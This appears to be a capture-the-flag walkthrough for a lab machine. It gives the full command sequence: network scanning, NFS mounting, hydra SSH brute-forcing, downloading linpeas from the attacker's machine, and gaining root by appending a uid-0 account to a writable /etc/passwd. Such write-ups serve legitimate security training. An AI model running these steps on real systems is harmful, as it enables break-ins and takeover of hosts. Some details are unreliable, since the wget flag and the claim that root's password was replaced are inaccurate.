1. Detect which devices are online on the same subnet.
    ```bash
    $ sudo netdiscover -i eth0
    ```
2. Scan the IP.
    ```bash
    $ nmap 192.168.121.129 -sV
    PORT       STATE SERVICE       VERSION
    22/tcp     open  ssh                OpenSSH 9.6 (protocol 2.0)
    80/tcp     open  http               Apache httpd 2.4.58 ((Unix))
    111/tcp    open  rpcbind         2-4 (RPC #100000)
    139/tcp    open  netbios-ssn   Samba smbd 4.6.2
    445/tcp    open  netbios-ssn   Samba smbd 4.6.2
    2049/tcp   open  nfs                3-4 (RPC #100003)
    3306/tcp   open  mysql           MariaDB (unauthorized)
    8080/tcp   open  http              Apache httpd 2.4.58 ((Unix))
    ```
3. Determine which directory is available for mounting a server.
    ```bash
    $ showmount -e 192.168.121.129
    Export list for 192.168.121.129:
    /home/john/share *
    ```
4. Mount the remote NFS shared directory to a local directory.
    ```bash
    $ sudo mount -t nfs -o nolock 192.168.121.129:/home/john/share ~/Desktop/alpine
    ```
5. List the shared directory and user/group information.
    ```bash
    $ enum4linux -a 192.168.121.129
    S-1-22-1-1000 Unix User\onward (Local User)
    S-1-22-1-1001 Unix User\john (Local User)
    S-1-22-1-1002 Unix User\ariel (Local User)
    ```
6. Try brute-forcing the password for each of the three usernames.
    ```bash
    $ hydra -l ariel -P ~/Desktop/passwd.txt ssh://192.168.121.129
    ```
7. Connect to the remote server.
    ```bash
    $ ssh ariel@192.168.121.129
    ```
8. Get the first flag.
    ```bash
    $ cat flag
    onward{0nw4rd41pin3_4ri3l_fl4g}
    ```
9. Start a listener on the attacker side.
    ```bash
    $ python -m http.server
    ```
   The victim downloads the `linpeas.sh` script from the attacker's machine.
    ```bash
    $ wget 192.168.121.128:8000/linpeas.sh -o /tmp/linpeas.sh
    $ cd /tmp
    $ chmod +x linpeas.sh
    ```
10. Run `linpeas`.
    ```bash
    $ ./linpeas.sh
    /etc/passwd is writable
    ```
11. Check `/etc/passwd`.
    ```bash
    $ ls -la /etc/passwd
    -rw-rw-rw-    1 root     root          1532 Dec 27  2023 /etc/passwd
    ```
    - It was discovered that privilege escalation is possible and that any user can read and write it.
12. Begin privilege escalation.
    ```bash
    $ openssl passwd -1 -salt hack hack
    ```
    - Use `openssl` to encrypt the password.
    ```bash
    $ echo 'hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0::/root:/bin/ash' >> /etc/passwd
    ```
    - This formats the generated password and writes the data into `/etc/passwd`. At this point, the root password has been replaced with the previously generated `hack` password.
13. Switch to the newly created root user.
    ```bash
    $ su hack
    ```
14. Print the second flag.
    ```bash
    $ cat flag
    onward{0nw4rd41pin3_root_fl4g}
    ```
15. Search all files directly to find the third flag.
    ```bash
    $ grep -ri "flag" /var/www
    onward{0nw4rd41pin3_w3b_fl4g_byp455_403}
    ```
